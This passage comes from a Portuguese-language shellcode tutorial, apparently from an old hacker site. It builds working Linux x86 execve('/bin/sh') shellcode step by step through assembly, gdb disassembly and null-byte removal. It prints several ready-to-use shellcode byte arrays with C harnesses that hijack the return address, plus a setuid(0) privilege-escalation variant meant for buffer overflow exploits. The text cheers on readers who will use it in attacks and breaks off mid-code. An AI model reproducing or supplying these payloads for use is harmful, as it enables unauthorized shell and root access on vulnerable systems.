+Isso tudo fica armazenado em:
+0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
+
+Eis aih o porque.
+Quanto a usarmos 0 em exit(), eh somente porque a maioria dos programas
+retornam 0 na saida para indicar que nao possui erros.Se tiver acesso
+ao codigo fonte dos programas, verifique, porque isso pode muito bem
+mudar.
+
+Como necessitamos inserir uma saida limpa(caso execve() falhe), descrita
+no exemplo acima, nossos passos em busca de um shellcode eficiente mudam.
+Teremos entao agora:
+
+
+1. Ter a string "/bin/sh" terminada nula em algum lugar na memoria.
+
+2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
+   por uma word null long.
+
+3. Copiar 0xb sobre o registrado EAX.
+
+4. Copiar o endereco do endereco da string "/bin/sh" sobre o registrado
+   EBX.
+
+5. Copiar o endereco da string "/bin/sh" sobre o registrado ECX.
+
+6. Copiar o endereco da null word long sobre o registrador EDX.
+
+7. Executar a instrucao int $0x80.
+
+* Aqui comeca o exit().
+
+8. Copiar 0x1 sobre registrado EAX.
+
+9. Copiar 0x0 sobre o registrador EBX.
+
+10.Executar a instrucao $0x80.
+
+Como podemos ver, para a funcao exit() nao temos muita coisa,senao tres
+linhas apenas, expliquei tudo aquilo acima porque quero que voce entenda
+como a coisa funciona.Nao vejo como saber que necessitamos do passo 9,
+sem sabermos de onde vem esse 0x0.
+Lembrando que eh para Newbies que escrevo, nao o termo Newbie do
+livro "A Internet e os Hackers", onde a unica coisa que escapa neste
+livro eh a capa, tem um bom ditado para isso: "Nao julgue o livro
+pela capa!", quando falo Newbies, sao sim pesquisadores, pessoas
+com espirito com fome de conhecimento, mas que por um motivo ou outro,
+nao conseguem acesso a material de nivel.Manisfestos a parte, vamos
+continuando nossa jornada.
+
+Sabemos os passos que devemos seguir, entao iremos agora formar esses
+passos  num esquema de codigos asm para facilitar ainda mais nosso
+aprendizado.
+
+O esquema seria mais ou menos o seguinte:
+
+movl endereco_da_string, endereco_do_endereco_da_string
+movb $0x0, endereco_do_byte_nulo
+movl $0x0, endereco_do_nulo
+movl $0xb, %eax
+movl endereco_da_string, %ebx
+leal endereco_da_string, %ecx
+leal string_nula, %edx
+int $0x80
+movl $0x1, %eax
+movl $0x0, %ebx
+int $0x80
+/bin/sh vem aqui.
+
+Podemos visualizar que estamos bem proximo de conseguir efetivar nosso
+shellcode.Mas surge um problema, nos nao sabemos onde no espaco da memoria
+do programa alvo nos iremos exploitar o codigo(e a string que segue ele
+serah colocada).Uma possivel solucao para isso, seria usar as instrucoes
+JMP e CALL para circular nosso codigo.Essas instrucoes podem usar
+enderecamento IP relativo, que despreza que nos podemos saltar para um
+offset do IP atual sem necessitar saber o endereco exato de onde na
+memoria nos queremos saltar.Se colocarmos uma instrucao CALL antes da
+string "/bin/sh" e uma intrucao JMP para ela(instrucao CALL), o
+endereco da string serah empurrado sobre o Stack como o endereco de
+retorno(return address) quando CALL for executado.Exato amigo!!
+Acontecerah exatamente isto que voce estah imaginando.Mas para isso
+precisamos copiar o endereco de retorno sobre um registrador, com isso
+a intrucao CALL pode chamar o inicio de nosso codigo.Veremos agora como
+ficarah nosso esquema em asm:
+
+jmp offset-para-chamar                  # 2 bytes
+popl %esi                               # 1 byte
+movl %esi, array-offset(%esi)           # 3 bytes
+movb $0x0, nullbyte-offset(%esi)        # 4 bytes
+movl $0x0, null-offset(%esi)            # 7 bytes
+movl $0xb, %eax                         # 5 bytes
+movl %esi, %ebx                         # 2 bytes
+leal array-offset(%esi), %ecx           # 3 bytes
+leal null-offset(%esi), %edx            # 3 bytes
+int $0x80                               # 2 bytes
+movl $0x1, %eax                         # 5 bytes
+movl $0x0, %ebx                         # 5 bytes
+int  $0x80                              # 2 bytes
+call offset-para-popl                   # 5 bytes
+/bin/sh vem aqui                        # 5 bytes
+
+Analizando bem o esquema acima, veremos algumas mudancas, nao nos
+conceitos,mas na sintaxe asm propriamente dita, onde (%esi) eh
+o source index, que se refere ao endereco da memoria onde se encontrarah
+a nossa string /bin/sh, lembrando amigo, que esse comando descrito no
+final do esquema acima,mais precisamente na ultima linha(/bin/sh), eh
+o que queremos executar a partir da shell.Voce poderia e pode, perfeita-
+mente colocar um comando, como "/bin/ls", para ver que isso se refere
+somente a um argumento para a execucao de um comando pela shell.
+Isto torna as  coisas claras, no final desse exemplo com /bin/sh,
+eu acrescentarei alguns possiveis comandos substitutos para essa ultima
+linha,  inclusive alguns exemplo de codigos maliciosos.
+Abaixo segue uma explicacao simples detalhando o que eh o eskema acima:
+
+jmp offset-para-chamar                  # 3 bytes
+popl %esi                               # 1 byte
+
+Essas duas novas linhas sao responsaveis pela mudanca.jmp, como dito
+faz saltar para o endereco, nesse caso offset, declarado em
+offset-para-chamar. Esse offset eh o endereco de call, apos isso, call
+chamarah popl %esi.Continuando:
+
+movl %esi, array-offset(%esi)           # 3 bytes
+movb $0x0, nullbyte-offset(%esi)        # 4 bytes
+movl $0x0, null-offset(%esi)            # 7 bytes
+movl $0xb, %eax                         # 5 bytes
+movl %esi, %ebx                         # 2 bytes
+leal array-offset(%esi), %ecx           # 3 bytes
+leal null-offset(%esi), %edx            # 3 bytes
+int $0x80                               # 2 bytes
+
+Acima segue os nossos passos de 1 a 7, referentes aos codigos de execve().
+Continuando:
+
+movl $0x1, %eax                         # 5 bytes
+movl $0x0, %ebx                         # 5 bytes
+int  $0x80                              # 2 bytes
+
+Acima estao os codigos referentes a funcao exit(), descritos nos nossos
+passos de 8 a 10.Continuando:
+
+call offset-para-popl                   # 5 bytes
+/bin/sh vem aqui                        # 8 bytes
+
+Aih em cima podemos ver a instrucao call, responsavel por fazer o giro
+ou circulo.Essa instrucao chama a intrucao popl lah em cima.Voce pode
+estar se perguntando se esse giro nao seria um loop infinito.Na verdade
+isso nao acontece, lembrando, estamos trabalhando com assembly, como
+estamos manipulando enderecos de memoria, o endereco correspondente a
+instrucao call que eh saltada usando jmp no inicio, nao serah mais
+chamado, logo nao existe um loop infinito.Acho que as coisas sao mais
+claras para o pessoal que meche bem com "goto". :)
+Voce pode recapitular o item 6.4, caso ainda tenha duvida.
+
+O grafico abaixo pode ajudar voce a compreender melhor tudo o que estah
+acontecendo aqui:
+
+Parte inferior                                    Topo da Memoria
+da memoria
+
+          buffer         sfp   ret      a       b        c
+
+<---- [JJSSSSSSSSCCss] [ssss] [0xD8]  [0x01]  [0x02]  [0x03]
+       ^|^       ^|              |
+       |||_______||______________|
+        ||_______||
+         |________|
+
+
+Topo do Stack                                     Parte inferior do Stack
+
+Onde:
+
+J -> Refere a intrucao JMP.
+C -> Refere a instrucao CALL.
+S -> Codigo asm que queremos executar.
+s -> Codigo da string que queremos executar ("/bin/sh").
+
+buffer -> Nosso buffer que conterah o shellcode..
+sfp -> O frame pointer.      --_ Para efeito de
+ret -> Endereco de retorno.  --    overflows
+
+A seta indica para onde estah saltando a instrucao.
+
+Espero que tudo tenha clareado mais para voce.Em cima disso, podemos
+calcular os offsets necessarios para jmp saltar para call, de call
+para popl, do endereco da string para o array, e do endereco da
+string p/ a word null long.
+Caso alguem possua duvidas de como se descobrir os offsets, lembro
+novamente, eh bom aprender mais sobre assembly e praticar as operacoes
+com sistemas numericos(decimal,hexa e binario)!!
+
+Colocarei novamente o codigo para que nao haja duvidas sobre como
+saber o endereco dos offsets a chamar.
+
+jmp offset-para-chamar                # 3 bytes
+popl %esi                             # 1 byte  ------  <---------------
+movl %esi, array-offset(%esi)         # 3 bytes       |                 |
+movb $0x0, nullbyte-offset(%esi)      # 4 bytes       |                 |
+movl $0x0, null-offset(%esi)          # 7 bytes       |                 |
+movl $0xb, %eax                       # 5 bytes       | Somando tudo    |
+movl %esi, %ebx                       # 2 bytes       |   teremos       |
+leal array-offset(%esi), %ecx         # 3 bytes       ->  42 bytes      |
+leal null-offset(%esi), %edx          # 3 bytes       |(0x2a em hexa)   |
+int $0x80                             # 2 bytes       |                 |
+movl $0x1, %eax                       # 5 bytes       |                 |
+movl $0x0, %ebx                       # 5 bytes       |                 |
+int  $0x80                            # 2 bytes ______|                 |
+call offset-para-popl                 # 5 bytes --> 42 + 5 = 47(0x2f)---
+/bin/sh vem aqui                      # 8 bytes
+
+
+Seguindo em frente, veremos como nosso codigo ficarah inserindo-o em
+um programa C, com os respectivos enderecos calculados.
+Somente observe, nao compile ainda.
+
+#include<stdio.h>
+#include <stdlib.h>
+void main() {
+__asm__("
+        jmp    0x2a                     # 3 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        movb   $0x0,0x7(%esi)           # 4 bytes
+        movl   $0x0,0xc(%esi)           # 7 bytes
+        movl   $0xb,%eax                # 5 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        movl   $0x1, %eax               # 5 bytes
+        movl   $0x0, %ebx               # 5 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x2f                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+");
+}
+
+Existe um probleminha amigo, para que o nosso codigo funcione,
+necessitamos declarar ele como uma variavel global, para podermos colocar
+nosso codigo no Stack ou Segmento Data(onde teremos permissao de escrita)
+,transferindo o controle para ele,pois nosso codigo modifica ele mesmo
+e muitos sistemas operacionais marcam paginas de codigos read-only(soh
+leitura).Para fazermos isso, necessitamos da representacao hexadecimal
+do codigo binario.Vejamos abaixo como fazer isso tudo:
+
+* Primeiro compilamos o nosso programa acima, usando a seguinte sintaxe
+  na linha de comando:
+
+[localhost:/]$gcc -o shell -g -ggdb shell.c
+
+* Em seguida executamos o debugador.
+
+[localhost:/]$ gdb shell
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details. This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+* Agora vem a parte que se exige mais paciencia do fucador.Muita gente
+  acha um saco ter que fazer isso, mas nao tem outro jeito,paciencia
+  amigo.O esquema eh que o debugador nos dirah o codigo hexadecimal
+  correspondente a cada uma da linha de comando.Para fazer isso voce
+  digita o seguinte:
+
+(gdb)disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     jmp    0x804817f <main+47>
+0x8048155 <main+5>:     pop    %esi
+0x8048156 <main+6>:     mov    %esi,0x8(%esi)
+0x8048159 <main+9>:     movb   $0x0,0x7(%esi)
+0x804815d <main+13>:    movl   $0x0,0xc(%esi)
+0x8048164 <main+20>:    mov    $0xb,%eax
+0x8048169 <main+25>:    mov    %esi,%ebx
+0x804816b <main+27>:    lea    0x8(%esi),%ecx
+0x804816e <main+30>:    lea    0xc(%esi),%edx
+0x8048171 <main+33>:    int    $0x80
+0x8048173 <main+35>:    mov    $0x1,%eax
+0x8048178 <main+40>:    int    $0x80
+0x804817a <main+42>:    call   0x8048150 <main>
+0x804817f <main+47>:    das
+0x8048180 <main+48>:    bound  %ebp,0x6e(%ecx)
+0x8048183 <main+51>:    das
+0x8048184 <main+52>:    jae    0x80481ee <__new_exitfn+54>
+0x8048186 <main+54>:    add    %cl,0x90c35dec(%ecx)
+End of assembler dump.
+
+Isso voce jah sabe o que faz(mostra codigo asm do nosso programa),agora
+amigo para saber o codigo hexadecimal de cada um desses comandos, voce
+terah que digitar o seguinte " x/xb <indice>" como no esquema abaixo:
+
+(gdb) x/xb main+3
+0x8048153 <main+3>:     0xeb
+(gdb) x/xb main+4
+0x8048154 <main+4>:     0x2a
+(gdb) x/xb main+5
+0x8048155 <main+5>:     0x5e
+(gdb) x/xb main+6
+0x8048156 <main+6>:     0x89
+.
+.
+.
+(gdb) x/xb main+56
+0x8048188 <main+56>:    0xec
+(gdb) x/xb main+57
+0x8048189 <main+57>:    0x5d
+(gdb) x/xb main+58
+0x804818a <main+58>:    0xc3
+(gdb) x/xb main+59
+0x804818b <main+59>:    0x90
+
+Voce comecarah com o indice "main+3" e irah ateh quando chegar o
+hexadecimal "0x90" que corresponde a instrucao NOP, que corresponte a
+uma instrucao vazia(sem operacao nenhuma), que faz com que o programa
+siga em frente, como se ela nao existisse (essa linha nao deve entrar
+no nosso shell code).Caso em outro shellcode feito por voce, isso nao
+apareca, coloque os hexadecimais ateh a ultima instrucao da funcao main().
+
+Feito tudo isso, voce colocarah todos as linhas do programa em hexa, numa
+variavel global, como no esquema abaixo:
+
+/* Exemplo inicial de shellcode
+   Compile com: $gcc -o shell1 shell1.c
+
+ */
+#include <stdio.h>
+
+char shellcode[] =
+        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+
+void main() {
+   int *retorno;
+  retorno = (int *)&retorno + 2;
+   (*retorno) = (int)shellcode;
+
+}
+
+Depois de compilado voce pode executar ele normalmente, como no exemplo
+abaixo:
+
+[localhost:/]$ gcc -o shell1 shell1.c
+[localhost:/]$./shell1
+bash$ exit
+exit
+
+Como podemos ver, ele funciona perfeitamente.Mas vou direcionar agora
+a solucao de um problema para aqueles que usarao shellcodes em buffer
+overflows.Nao podemos inserir ele num exploit sem antes tirar-lhe
+todos os bytes nulos(null bytes).Por que? Leia o tutorial sobre
+overflows que fiz, em breve na http://unsekurity.virtualave.net ...ele
+explica o porque disso. Seguindo em frente, para tirarmos os bytes
+nulos, seguimos o seguinte esquema:
+
+Instrucao com null byte                       Trocar por:
+------------------------------------------------------------------------
+movb $0x0,0x7(%esi)                         xorl %eax,%eax
+                                            movb %eax,0x7(%esi)
+movl $0x0,0xc(%esi)                         movl %eax,0xc(%esi)
+-------------------------------------------------------------------------
+movl $0xb,%eax                              movb $0xb,%al
+-------------------------------------------------------------------------
+movl $0x1,%eax                              xorl %ebx,%ebx
+movl $0x0,%ebx                              movl %ebx,%eax
+                                            inc  %eax
+-------------------------------------------------------------------------
+Como podemos ver, nao ha muita coisa para fazermos no intuito de retirar
+os null bytes.Veremos entao como fica o nosso codigo apos a substituicao
+dos mesmos:
+
+/* Shellcode com substituicao dos null bytes */
+
+#include <stdio.h>
+main(){
+__asm__("
+jmp 0x1f                                #2 bytes
+popl %esi                               #1 byte
+movl %esi,0x8(%esi)                     #3 bytes
+xorl %eax,%eax                          #2 bytes
+movb %eax,0x7(%esi)                     #3 bytes
+movl %eax,0xc(%esi)                     #3 bytes
+movb $0xb,%al                           #2 bytes
+movl %esi,%ebx                          #2 bytes
+leal 0x8(%esi),%ecx                     #3 bytes
+leal 0xc(%esi),%edx                     #3 bytes
+int $0x80                               #2 bytes
+xorl %ebx,%ebx                          #2 bytes
+movl %ebx,%eax                          #2 bytes
+inc %eax                                #1 byte
+int $0x80                               #2 bytes
+call -0x24                              #5 bytes
+.string \"/bin/sh\"                     #8 bytes
+");
+}
+
+Compilamos entao usando a seguinte sintaxe:
+[localhost:/]$gcc -ggdb -static -o shellnova1 shellnova1.c
+
+Em seguida usamos o debugador p/ novamente pegarmos o codigo em hexa:
+[localhost:/]$gdb shellnova1
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     jmp    0x8048174 <main+36>
+0x8048155 <main+5>:     pop    %esi
+0x8048156 <main+6>:     mov    %esi,0x8(%esi)
+0x8048159 <main+9>:     xor    %eax,%eax
+0x804815b <main+11>:    mov    %al,0x7(%esi)
+0x804815e <main+14>:    mov    %eax,0xc(%esi)
+0x8048161 <main+17>:    mov    $0xb,%al
+0x8048163 <main+19>:    mov    %esi,%ebx
+0x8048165 <main+21>:    lea    0x8(%esi),%ecx
+0x8048168 <main+24>:    lea    0xc(%esi),%edx
+0x804816b <main+27>:    int    $0x80
+0x804816d <main+29>:    xor    %ebx,%ebx
+0x804816f <main+31>:    mov    %ebx,%eax
+0x8048171 <main+33>:    inc    %eax
+0x8048172 <main+34>:    int    $0x80
+0x8048174 <main+36>:    call   0x8048155 <main+5>
+0x8048179 <main+41>:    das
+0x804817a <main+42>:    bound  %ebp,0x6e(%ecx)
+0x804817d <main+45>:    das
+0x804817e <main+46>:    jae    0x80481e8 <__new_exitfn+52>
+0x8048180 <main+48>:    add    %cl,0x90c35dec(%ecx)
+End of assembler dump.
+(gdb) x/xb main+3
+0x8048153 <main+3>:     0xeb
+(gdb) x/xb main+4
+0x8048154 <main+4>:     0x1f
+(gdb) x/xb main+5
+0x8048155 <main+5>:     0x5e
+(gdb) x/xb main+6
+0x8048156 <main+6>:     0x89
+(gdb) x/xb main+7
+0x8048157 <main+7>:     0x76
+(gdb) x/xb main+8
+0x8048158 <main+8>:     0x08
+(gdb) x/xb main+9
+0x8048159 <main+9>:     0x31
+.
+.
+.
+0x8048178 <main+40>:    0xff
+
+Podemos perfeitamente parar por aqui e no nosso shellcode no codigo-fonte
+acrescentarmos a string /bin/sh que se refere ao que queremos executar.
+Fazendo isso teriamos o seguinte shellcode:
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+Mas se nos quisermos substituir a string /bin/sh por seu correspondente
+
+em hexadecimal, nos devemos continuar pegando os respectivos codigos hexa
+pelo debugador, ateh encontrarmos uma intrucao nop que corresponderah ao
+fim da funcao main().Vejamos:
+
+Haviamos para em <main + 40>
+Continuando:
+
+(gdb) x/xb main+41
+0x8048179 <main+41>:    0x2f
+(gdb) x/xb main+42
+0x804817a <main+42>:    0x62
+(gdb) x/xb main+43
+0x804817b <main+43>:    0x69
+(gdb) x/xb main+44
+0x804817c <main+44>:    0x6e
+(gdb) x/xb main+45
+0x804817d <main+45>:    0x2f
+.
+.
+.
+0x8048183 <main+51>:    0x5d
+(gdb) x/xb main+52
+0x8048184 <main+52>:    0xc3
+(gdb) x/xb main+53
+0x8048185 <main+53>:    0x90
+(gdb) x/xb main+54
+0x8048186 <main+54>:    0x90
+
+Como podemos ver chegamos ateh a instrucao NOP(0x90), logo nao incluiremos
+ela em nosso shellcode, devemos entao acrescentar ateh <main+52>, fazendo
+entao nosso shellcode ficar assim:
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+Feito isso tudo iremos agora inserir nosso exemplo de shellcode
+dentro de um codigo-fonte C.
+
+/* Simples Exemplo de Shellcode com string /bin/sh em hexa
+   Compile com: $gcc -o shellnova2 shellnova2.c */
+
+#include <stdlib.h>
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+void main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+
+O esquema na linha de comando seria:
+[localhost:/]$ gcc -o shellnova2 shellnova2.c
+[localhost:/]$ ./shellnova2
+bash$ exit
+exit
+
+Como podemos ver perfeitamente, ele funciona bem como queriamos.
+Voce que vai usa-lo em buffer overflows,boa sorte!!Lembrando que alguns
+shellcodes devem ser usados p/ determinada situacao e outros p/ outras
+situacoes.Use seus neuronios, pense nas formas de ataque, e da necessidade
+de cada shellcode, vai fundo, nao deixe de estudar,pesquise,descubra!!
+
+Como prometido, disponibilizarei agora alguns esquemas que podemos
+fazer para executar alguns codigos maliciosos em cima deste exemplo
+descrito acima.Para os codigos que se seguem,tudo que devemos fazer
+eh substituir simplesmente, o comando "/bin/sh" que queremos executar,
+no final de nosso shellcode, por outro, de tamanho igual.
+Vejamos nosso shellcode como estah:
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+Eh essa string acima "/bin/sh", que estou me referindo, voce pode
+testar outros comandos inserindo-os no lugar dela,sendo que de
+tamanho igual, como /bin/ls, /bin/su, /bin/ed e por aih vai.
+Vejamos alguns exemplos bem praticos:
+
++ Simples shellcode para executar um ls;
+
+/* Shellcode que executa um ls */
+#include <stdio.h>
+
+/* Apenas trocamos /bin/sh por /bin/ls no final do shellcode */
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/ls";
+
+void main() {
+   int *retorno;
+
+   retorno = (int *)&retorno + 2;
+   (*retorno) = (int)shellcode;
+
+}
+
+Compilamos e executamos:
+
+[localhost:/]$ gcc -o shels shels.c
+[localhost:/]$ ./shels
+exe1.c                 heap3                  shellcode2
+exe2                   heap3.c                shellcode2.c
+exe2.c                 mall                   shellcode2.s
+exploit.txt            mall.c                 shellcodeasm
+exploit1               mall1                  shellcodeasm.c
+exploit1.c             my                     shels
+exploit2               nistir4909             shels.c
+exploit2.c             out.c                  shelsc
+exploit3               perlsec.txt            shelsc.c
+exploit3.c             review.txt             sp
+exploit4               robust.txt             sp.c
+exploit4.c             seculinuxprog          sta
+fake                   secure_prog_checklist  sta.c
+fake_exp               security-holes.txt     suid
+fake_exp.c             setuid.7.txt           suid.c
+find                   sh1                    taxonomy.ps
+full-cve.txt           sh1.c                  testsc
+fuzz-revisited.ps.Z    shel1.c                testsc.c
+heap1                  shell1.c               vulnerable
+heap1.c                shellcode              vulnerable.c
+
+Podemos ver que ele funfa(funciona) perfeitamente!!:)
+
+Mas voce nao iria estudar e pesquisar muito somente para executar um
+comando desse tipo..Nao sei mano,vai ver ele pode ser util para alguma
+coisa remotamente, talvez envolvendo sockets, mas coloquei ele aih
+para ilustrar de forma clara e simples a alteracao basica de um
+shellcode.Olhando para o exemplo acima voce pode tirar algumas
+conclusoes apressadas, como trocar o /bin/sh por /bin/zsh, ou mesmo
+por /bin/tcsh, ou qualquer outra shell, mas na verdade nao funciona
+deste modo, teremos sim que ralar para fazermos shellcodes para cada
+uma delas, o exemplo citada nos da permissao para executarmos alguns
+comandos(somente alguns) de tamanho igual shell "/bin/sh" ou da que estah
+linkada para ela, como em muitos sistemas encontramos /bin/bash, que eh
+o meu caso.Veremos como fazer alguns outros tipos de shell mais abaixo.
+Para ilutrar e voce poder entender melhor o que estou dizendo, veja
+o mesmo exemplo acima mas com mais caracteres apos a execucao de ls:
+
+/* Exemplo de shellcode, para mostrar que nao faz efeito
+   colocarmos mais caracteres do que o suportado pelo
+   nosso exemplo inicial */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/lsissoquetahentrandoaquiehparailustrar";
+
+void main() {
+   int *retorno;
+
+   retorno = (int *)&retorno + 2;
+   (*retorno) = (int)shellcode;
+
+}
+
+Compilamos normalmente o exemplo acima, e em seguida executamos:
+
+[localhost:/]$ gcc -o ls2.c ls2.c
+[localhost:/]$ ./ls2
+avancadas     popshbug.c    shell3.c      shellt.c      teso1sh.s
+bossh1.c      scsh          shellba       shelltc       teso2sh.c
+bossh1.s      scsh.c        shellba.c     shelltc.c     teso2sh.s
+difshe        shec          shellc        shelltc.s     teso3sh.c
+difshe.c      shechroot.c   shelln.c      shelltcasm    teso3sh.s
+difshe.s      shechroot1    shellpron1    shelltcasm.c  testshtc
+ls2           shell         shellpron1.c  shelltcasm.s  testshtc.c
+ls2.c         shell.c       shellpron2    shelltcsh     trojans
+passshe.c     shell2        shellpron2.c  shelt
+passwd        shell2.c      shellsetu     tcsh.sh
+popshbug      shell3        shellsetu.c   teso1sh.c
+
+Como podemos ver, nao adiantou nada metermos um monte de caracteres no
+nosso shellcode, pois ele soh procurou executar somente o tamanho de
+bytes que fora permitido.Se voce tah querendo saber como solucionar
+isto, leia a parte 7.4. :)
+
+
+7.2 SHELLCODE P/ SETUID(0)
+----------------------------------------------------
+
+Esse exemplo vai para o pessoal que meche com buffer overflows,
+vamos inserir o codido do programa abaixo em nosso shellcode inicial,
+o do /bin/sh;
+
+/* Codigo de setuid() */
+
+#include <stdio.h>
+
+main()
+{
+        setuid(0);
+}
+
+Compilamos e em seguida executamos gdb;
+
+[localhost:/]$ gcc -o setui setui.c -static -ggdb
+[localhost:/]$ gdb setui
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+Como vamos inserir o codigo, nao precisamos disassemblar main, basta
+setuid.
+
+(gdb) disassemble setuid
+Dump of assembler code for function setuid:
+0x80483e4 <setuid>:     push   %ebp
+0x80483e5 <setuid+1>:   mov    %esp,%ebp
+0x80483e7 <setuid+3>:   push   %ebx
+0x80483e8 <setuid+4>:   mov    $0x17,%eax
+0x80483ed <setuid+9>:   mov    0x8(%ebp),%ebx
+0x80483f0 <setuid+12>:  int    $0x80
+0x80483f2 <setuid+14>:  mov    %eax,%edx
+0x80483f4 <setuid+16>:  test   %edx,%edx
+0x80483f6 <setuid+18>:  jge    0x8048408 <setuid+36>
+0x80483f8 <setuid+20>:  neg    %edx
+0x80483fa <setuid+22>:  push   %edx
+0x80483fb <setuid+23>:  call   0x8050b0c <__normal_errno_location>
+0x8048400 <setuid+28>:  pop    %edx
+0x8048401 <setuid+29>:  mov    %edx,(%eax)
+0x8048403 <setuid+31>:  mov    $0xffffffff,%eax
+0x8048408 <setuid+36>:  pop    %ebx
+0x8048409 <setuid+37>:  mov    %ebp,%esp
+0x804840b <setuid+39>:  pop    %ebp
+0x804840c <setuid+40>:  ret
+0x804840d <setuid+41>:  nop
+0x804840e <setuid+42>:  nop
+0x804840f <setuid+43>:  nop
+End of assembler dump.
+(gdb)
+
+O codigo eh enorme, mas voce jah sabe, somente as primeiras 6 linhas
+nos interessam...abaixo estao elas:
+
+0x80483e4 <setuid>:     push   %ebp
+0x80483e5 <setuid+1>:   mov    %esp,%ebp
+0x80483e7 <setuid+3>:   push   %ebx
+0x80483e8 <setuid+4>:   mov    $0x17,%eax
+0x80483ed <setuid+9>:   mov    0x8(%ebp),%ebx
+0x80483f0 <setuid+12>:  int    $0x80
+
+Lembrando que queremos somente ateh a instrucao int $0x80, que faz com
+que nosso programa entre no modo kernel.
+
+Traduzindo o que essas 6 linhas representam:
+
+0x80483e4 <setuid>:     push   %ebp
+0x80483e5 <setuid+1>:   mov    %esp,%ebp
+0x80483e7 <setuid+3>:   push   %ebx
+
+Procedimento Preludio, ou inicial.Velho esquema, nao iremos inserir
+essas 3 linhas no nosso codigo por razoes obvias, jah temos um
+procedimento inicial(preludio) no nosso shellcode.
+
+0x80483e8 <setuid+4>:   mov    $0x17,%eax
+0x80483ed <setuid+9>:   mov    0x8(%ebp),%ebx
+0x80483f0 <setuid+12>:  int    $0x80
+
+Essas sim nos interessam, pois sao as responsaveis pela execucao
+do codigo que nos interessa, neste caso setuid(0).Para nao termos
+bytes nulos(null bytes), alteramos essas linhas da seguinte forma:
+
+Pegamos:                                        Substituimos por:
+----------------------                  ---------------------------
+mov    $0x17,%eax                              xorl %eax,%eax
+mov    0x8(%ebp),%ebx                          xorl %ebx,%ebx
+                                               mov  $0x17,%al
+-------------------------------------------------------------------
+                                        
+Deixamos esta como esta:
+
+int    $0x80
+
+Depois juntado tudo teremos o shellcode para setuid(0), assim:
+
+
+xorl %eax,%eax
+xorl %ebx,%ebx
+movb $0x17,%al
+int $0x80
+
+Acrescentando ele ao inicio de nosso shellcode /bin/sh inicial,
+teremos:
+
+#include <stdio.h>
+main(){
+__asm__("
+xorl %eax,%eax
+xorl %ebx,%ebx
+movb $0x17,%al
+int $0x80
+jmp 0x1f
+popl %esi
